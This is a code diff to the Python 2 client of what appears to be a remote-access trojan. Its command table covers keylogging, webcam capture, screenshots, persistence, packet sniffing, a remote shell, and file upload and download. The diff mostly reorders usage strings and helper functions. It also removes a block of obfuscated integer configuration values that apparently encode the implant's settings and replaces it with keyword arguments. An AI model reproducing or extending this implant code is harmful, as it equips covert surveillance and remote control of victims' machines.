@@ -93,7 +93,22 @@ class Client(object):
         self._commands  = {cmd: getattr(self, cmd) for cmd in __command__}
         self._result    = {mod: dict({}) for mod in self._modules}
 
-    
+    def _long_to_bytes(self, x):
+        try:
+            return bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
+        except Exception as e:
+            self._print("Long-to-bytes conversion error: {}".format(str(e)))
+
+    def _bytes_to_long(self, x):
+        try:
+            return long(bytes(x).encode('hex'), 16)
+        except Exception as e:
+            self._print("Bytes-to-long conversion error: {}".format(str(e)))            
+
+    def _print(self, data):
+        if bool('__v__' in vars(self) and self.__v__):
+            print(data)
+
     def command(fx, cx=__command__, mx=__modules__):
         fx.status = threading.Event()
         if fx.func_name is 'persistence':
@@ -140,6 +155,8 @@ class Client(object):
         else:
             cx.update({fx.func_name: fx})
         return fx
+
+   # ------------------- commands ------------------------- 
 
     @command
     def shell(self):
@@ -286,35 +303,34 @@ class Client(object):
         """encryption <on/off> - default: on"""
         return self.encryption.options
 
-
-    ls.usage			= 'ls <path>'
-    wget.usage			= 'wget <url>'
-    cd.usage			= 'cd <path>'
-    new.usage			= 'new <url>'
-    cat.usage			= 'cat <file>'
-    set.usage			= 'set <cmd> x=y'
-    help.usage			= 'help <option>'
-    show.usage			= 'show <option>'
-    disable.usage		= 'disable <cmd>'
-    enable.usage		= 'enable <cmd>'
-    upload.usage		= 'upload [file]'
-    options.usage		= 'options <cmd>'
-    pwd.usage			= 'pwd'
-    run.usage			= 'run'
-    kill.usage			= 'kill'
-    info.usage			= 'info'
-    jobs.usage			= 'jobs'
-    admin.usage			= 'admin'
-    shell.usage			= 'shell'
-    webcam.usage		= 'webcam'
-    status.usage		= 'status'
-    results.usage		= 'results'
-    standby.usage		= 'standby'
-    modules.usage		= 'modules'
-    keylogger.usage		= 'keylogger'
-    screenshot.usage	        = 'screenshot'
-    persistence.usage	        = 'persistence'
-    packetsniff.usage	        = 'packetsniff'
+    pwd.usage		= 'pwd'
+    run.usage		= 'run'
+    kill.usage		= 'kill'
+    info.usage		= 'info'
+    jobs.usage		= 'jobs'
+    admin.usage		= 'admin'
+    shell.usage		= 'shell'
+    webcam.usage	= 'webcam'
+    status.usage	= 'status'
+    results.usage       = 'results'
+    standby.usage       = 'standby'
+    modules.usage	= 'modules'
+    keylogger.usage	= 'keylogger'
+    screenshot.usage	= 'screenshot'
+    persistence.usage	= 'persistence'
+    packetsniff.usage	= 'packetsniff'
+    ls.usage		= 'ls <path>'
+    wget.usage		= 'wget <url>'
+    cd.usage		= 'cd <path>'
+    new.usage		= 'new <url>'
+    cat.usage		= 'cat <file>'
+    set.usage		= 'set <cmd> x=y'
+    help.usage		= 'help <option>'
+    show.usage		= 'show <option>'
+    disable.usage	= 'disable <cmd>'
+    enable.usage	= 'enable <cmd>'
+    upload.usage	= 'upload [file]'
+    options.usage	= 'options <cmd>'
 
     # ------------------- private functions -------------------------
 
@@ -347,22 +363,6 @@ class Client(object):
     def _help_jobs(self): return '\n' + '\n'.join(['  JOBS'] + [' -----------------------------------------------'] + [' {}{:>40}'.format(a, self._status(c=time.time()-float(self._threads[a].name))) for a in self._threads if self._threads[a].is_alive()])
     
     def _help_modules(self): return '\n' + '\n'.join(['  {}\t{}'.format('MODULE',' STATUS')] + [' -----------------------'] + [' {}\t{}'.format(mod, (' enabled' if self._modules[mod].status.is_set() else 'disabled')) for mod in self._modules if mod != 'webcam'] + [' {}\t\t{}'.format('webcam', (' enabled' if self._modules['webcam'].status.is_set() else 'disabled'))])
-
-    def _print(self, data):
-        if bool('__v__' in vars(self) and self.__v__):
-            print(data)
-
-    def _long_to_bytes(self, x):
-        try:
-            return bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
-        except Exception as e:
-            self._print("Long-to-bytes conversion error: {}".format(str(e)))
-
-    def _bytes_to_long(self, x):
-        try:
-            return long(bytes(x).encode('hex'), 16)
-        except Exception as e:
-            self._print("Bytes-to-long conversion error: {}".format(str(e)))            
 
     def _screenshot(self):
         tmp = tempfile.mktemp(suffix='.png')
@@ -1273,34 +1273,11 @@ class Client(object):
             except: pass
         return False
 
-
-
-
-# new modules go here
-
-
-
-
 # ----------------- main --------------------------
 
 def main(*args, **kwargs):
-    client = Client(**{
-#            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
-            "__c__": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
-#            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
-            "__d__": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
-            "__e__": "423224063517525567299427660991207813087967857812230603629111",
-            "__g__": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
-            "__q__": "61598604010609009282213705494203338077572313721684379254338652390030119727071702616199509826649119562772556902004",
-            "__s__": "12095051301478169748777225282050429328988589300942044190524181399447134546511973",
-            "__t__": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
-            "__u__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
-            "__v__": "1",
-	    "__w__": "12095051301478169748777225282050429328988589300942044190524180336593048582637364",
-            "__x__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
-            "__y__": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585"
-    })
-    return client
+    client = Client(**kwargs)
+    return client._start()
 
 
 if __name__ == '__main__':
